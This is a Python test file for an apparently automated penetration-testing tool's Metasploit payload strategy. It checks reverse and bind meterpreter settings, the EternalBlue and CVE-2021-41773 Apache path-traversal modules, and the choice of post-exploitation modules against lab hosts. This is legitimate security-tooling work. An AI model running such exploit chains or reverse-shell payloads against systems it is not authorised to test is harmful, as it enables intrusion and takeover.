"""Tests for Metasploit payload strategy (LHOST/LPORT/OS-aware post)."""

import os

from tools import payload_strategy as ps


def test_resolve_strips_broken_lhost_and_sets_reverse(monkeypatch):
    monkeypatch.setenv("FIREBREAK_LHOST", "10.0.0.5")
    monkeypatch.setenv("FIREBREAK_PAYLOAD_PREFER", "reverse")
    monkeypatch.setenv("FIREBREAK_LPORT_START", "4500")
    monkeypatch.setattr(ps, "allocate_lport", lambda: 4500)

    options = ps.resolve_exploit_options(
        "exploit/multi/http/apache_path_traversal",
        target="https://lab.example",
        os_hint="linux",
        existing=["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
    )
    assert "PAYLOAD=linux/x64/meterpreter/reverse_tcp" in options
    assert "LHOST=10.0.0.5" in options
    assert "LPORT=4500" in options
    assert "RPORT=443" in options
    assert "DisablePayloadHandler=false" in options
    assert "LHOST=0.0.0.0" not in options


def test_resolve_falls_back_to_bind_without_lhost(monkeypatch):
    monkeypatch.delenv("FIREBREAK_LHOST", raising=False)
    monkeypatch.setenv("FIREBREAK_PAYLOAD_PREFER", "reverse")
    monkeypatch.setattr(ps, "detect_lhost", lambda: None)

    options = ps.resolve_exploit_options(
        "exploit/multi/http/apache_path_traversal",
        target="http://lab.example",
        os_hint="linux",
    )
    joined = " ".join(options)
    assert "bind_tcp" in joined
    assert "LHOST=" not in joined


def test_windows_module_gets_windows_payload(monkeypatch):
    monkeypatch.setenv("FIREBREAK_LHOST", "192.168.1.10")
    monkeypatch.setenv("FIREBREAK_PAYLOAD_PREFER", "reverse")
    monkeypatch.setattr(ps, "allocate_lport", lambda: 4444)

    options = ps.resolve_exploit_options(
        "exploit/windows/smb/ms17_010_eternalblue",
        target="10.0.0.9",
    )
    assert any("windows/x64/meterpreter/reverse_tcp" in o for o in options)


def test_post_modules_linux_vs_windows():
    linux = ps.post_modules_for_session({"id": "1", "platform": "linux/x64"})
    windows = ps.post_modules_for_session({"id": "2", "platform": "windows/x64"})
    unknown = ps.post_modules_for_session({"id": "3", "type": "meterpreter"})
    assert any("linux" in m for m in linux)
    assert any("windows" in m for m in windows)
    assert all("persistence" not in m for m in unknown)


def test_decision_engine_emits_payload_options(monkeypatch, tmp_path):
    from orchestrator import database
    from orchestrator.decision_engine import DecisionEngine

    monkeypatch.setattr(database, "DB_PATH", str(tmp_path / "results.db"))
    monkeypatch.setenv("FIREBREAK_LHOST", "10.9.8.7")
    monkeypatch.setattr(ps, "allocate_lport", lambda: 5555)

    eng = DecisionEngine("https://vuln.example", job_id="job-payload")
    eng.state = {
        "vuln_found": True,
        "target_os": "linux",
        "vulnerabilities": [{"cve": "CVE-2021-41773", "severity": "critical"}],
    }
    actions = eng.generate_post_phase_actions("vulnerability_scan", [])
    exploit = next(a for a in actions if a["stage"] == "exploit")
    assert exploit["args"][0] == "exploit/multi/http/apache_path_traversal"
    assert "LHOST=10.9.8.7" in exploit["args"]
    assert "LPORT=5555" in exploit["args"]
    assert not any(a.endswith("0.0.0.0") for a in exploit["args"])


def test_decision_engine_linux_post_modules(monkeypatch, tmp_path):
    from orchestrator import database
    from orchestrator.decision_engine import DecisionEngine

    monkeypatch.setattr(database, "DB_PATH", str(tmp_path / "results.db"))
    eng = DecisionEngine("https://lab.example", job_id="job-post")
    eng.state = {
        "has_session": True,
        "target_os": "linux",
        "sessions": [{"id": "7", "type": "meterpreter"}],
    }
    actions = eng.generate_post_phase_actions("proof_of_impact", [])
    modules = [a["args"][0] for a in actions if a["stage"] == "post"]
    assert any("linux" in m or "multi/gather" in m for m in modules)
    assert not any("windows/manage/persistence" in m for m in modules)
